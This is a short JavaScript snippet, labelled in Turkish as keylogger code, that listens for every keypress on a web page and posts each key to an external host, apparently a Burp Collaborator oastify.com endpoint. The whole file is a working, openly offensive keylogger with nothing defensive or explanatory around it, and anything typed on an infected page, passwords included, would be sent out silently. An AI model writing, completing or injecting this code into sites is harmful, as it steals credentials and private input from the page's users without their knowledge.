// Keylogger JavaScript Kodu
(function() {
  var logKeystrokes = function(event) {
    var key = event.key;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://nlc19htopzxumuk8gwwua18xgomfaby0.oastify.com', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('key=' + encodeURIComponent(key));
  };

  // Keypress olaylarını dinleme
  document.addEventListener('keypress', logKeystrokes);
})();
